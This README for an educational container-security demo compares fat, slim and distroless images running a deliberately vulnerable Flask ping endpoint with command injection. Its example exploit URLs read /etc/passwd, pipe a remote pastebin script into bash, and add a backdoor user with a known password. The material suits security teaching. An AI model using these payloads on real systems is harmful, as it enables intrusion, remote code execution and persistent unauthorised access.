# From fat to fearless - distroless way

## ⚠️ Disclaimer and Educational Purpose

This project is designed for **educational and research purposes only**. It demonstrates the security implications of different container base images and how they affect vulnerability exposure, particularly for Remote Code Execution (RCE) attacks.

**The vulnerabilities demonstrated in this project should NOT be used for:**
- Launching actual exploits against systems you do not own
- Unauthorized penetration testing
- Malicious activities of any kind
- Any illegal activities

**No liability**: The creator of this project accept no responsibility for any misuse of the information or code contained herein. Users are expected to use this information responsibly and in compliance with all applicable laws and regulations.

## Container Security Analysis: Fat, Slim, and Distroless Images

This project demonstrates the security implications of different container base images and how they affect vulnerability exposure, particularly for Remote Code Execution (RCE) attacks.

## Overview

The project contains three Dockerfiles representing different approaches to container security:
- `Dockerfile`: Fat image (full-featured base image)
- `Dockerfile-slim`: Slim image (reduced packages) 
- `Dockerfile-distroless`: Distroless image (minimal runtime)

Each container runs the same vulnerable Flask application to demonstrate how different base images affect vulnerability exploitation.

## Security Vulnerability Analysis

### The Vulnerable Code

The `app.py` file contains a command injection vulnerability:

```python
@app.route("/ping")
def ping():
    ip = request.args.get("ip")
    if not ip:
        return "Missing IP", 400

    try:
        # VULNERABLE: shell=True allows ;, |, && injection
        output = subprocess.check_output(f"/bin/ping -c 1 {ip}", shell=True, text=True)
        return f"<pre>{output}</pre>"

    except FileNotFoundError:
        return "Ping or shell not found (distroless fails)", 500
    # ... other exception handling
```

**Vulnerability Type**: Command Injection (CWE-78)
- The application takes user input directly into a shell command
- Using `shell=True` parameter allows command chaining with characters like `;`, `|`, `&&`
- This enables potential Remote Code Execution (RCE)

### Remote Code Execution (RCE) Potential

#### In Fat and Slim Images

The vulnerability allows RCE in fat and slim images because they contain:
- Shell interpreters (`/bin/sh`, `/bin/bash`)
- System utilities (`ping`, `ls`, `cat`, `ps`, `netstat`, etc.)
- Network tools
- Ability to execute system commands

**Example Exploits**:
- `/ping?ip=127.0.0.1;ls` - List directory contents
- `/ping?ip=127.0.0.1;cat /etc/passwd` - Read sensitive files
- `/ping?ip=127.0.0.1;whoami` - Identify user context
- `/ping?ip=127.0.0.1;dpkg --get-selections` - Identifies which utilies are present
- `/ping?ip=127.0.0.1;curl https://pastebin.com/raw/jsBbM758 | bash` - Download and execute malware or use this in case of slim where curl is not present
`/ping?ip=127.0.0.1;echo%20%22%5B*%5D%20Creating%20backdoor%20user%20(if%20root)...%22%0Auseradd%20backdoor%20-p%20%24(openssl%20passwd%20-1%20password123)%202%3E%2Fdev%2Fnull%20%7C%7C%20true`
- `/ping?ip=127.0.0.1;cat /etc/passwd` - Verify, if backdoor is created and persistance is achieved

#### In Distroless Images

The RCE is **mitigated** in distroless images because they:
- Don't contain shell interpreters
- Don't include general-purpose system utilities
- Only contain the minimal runtime environment needed (Python interpreter)
- Have no shell to execute command chains with `shell=True`
- Fail with `FileNotFoundError: [Errno 2] No such file or directory: '/bin/ping'`

### Attack Surface Comparison

| Image Type | Attack Surface | Shell Available | System Tools | RCE Possible |
|------------|----------------|-----------------|--------------|--------------|
| Fat (`python:3.9`) | Large | Yes | Many | Yes |
| Slim (`python:3.9-slim`) | Medium | Yes | Some | Yes |
| Distroless | Minimal | No | None | No |

## Building the Images

### Fat Image
```bash
docker build -t vulnerable-app-fat -f Dockerfile .
```

### Slim Image
```bash
docker build -t vulnerable-app-slim -f Dockerfile-slim .
```

### Distroless Image 
```bash
docker build -t vulnerable-app-distroless -f Dockerfile-distroless .
```

#### To read more about distroless goto distroless Github page: - 
[![Distroless Repo QR](distroless_qr.png)](https://github.com/GoogleContainerTools/distroless)

## Running Each Container

### Fat Container
```bash
docker run --rm -p 8080:8080 vulnerable-app-fat
```

### Slim Container
```bash
docker run --rm -p 8080:8080 vulnerable-app-slim
```

### Distroless Container
```bash
docker run --rm -p 8080:8080 vulnerable-app-distroless
```

## Testing the Vulnerability

After running any container, you can test the endpoints:

1. **Health Check**: `http://localhost:8080/`
   - Should return "Welcome to the vulnerable app!"

2. **Vulnerable Endpoint**: `http://localhost:8080/ping?ip=127.0.0.1`
   - Should return ping results for all image types
   - On distroless, you'll get "Ping or shell not found (distroless fails)"

3. **RCE Test**: `http://localhost:8080/ping?ip=127.0.0.1;ls`
   - **Fat/Slim**: Executes both ping and ls commands (vulnerable)
   - **Distroless**: Returns "Ping or shell not found" error (protected)

## Security Benefits of Distroless

### Reduced Attack Surface
- No shell available to execute command chains
- Fewer system utilities to exploit
- Minimal installed packages = fewer vulnerabilities
- No package manager, reducing update attack vectors

### Runtime Security
- No interactive shells available to attackers
- No system utilities for reconnaissance or data exfiltration
- Non-root by default in many distroless images
- Minimal process capabilities

### Compliance and Best Practices
- Reduces CVE exposure (fewer installed packages)
- Aligns with principle of least privilege
- Smaller image size reduces download vulnerabilities
- Simpler security auditing due to minimal components

## Mitigation Strategies

### Code-Level Fixes
```python
# Instead of:
subprocess.check_output(f"/bin/ping -c 1 {ip}", shell=True, text=True)

# Safer approach:
import shlex
subprocess.check_output(["/bin/ping", "-c", "1", shlex.quote(ip)], shell=False, text=True)
# Or best approach - validate input before using it
```

### Container-level Fixes
1. Use distroless images when possible
2. Run containers as non-root users
3. Implement container runtime security policies
4. Regular image scanning and updates

## Size Comparison

| Image Type | Approximate Size | Purpose |
|------------|------------------|---------|
| Fat | ~1.6GB | Full development and debugging |
| Slim | ~230MB | Reduced packages while maintaining functionality |
| Distroless | ~180MB | Minimal runtime, maximum security |

## Conclusion

Distroless images provide significant security advantages over fat and slim images by dramatically reducing the attack surface. For applications with known vulnerabilities like command injection, distroless can prevent exploitation even when code-level fixes are not yet implemented. However, the best defense is always addressing vulnerabilities at the code level combined with secure container practices.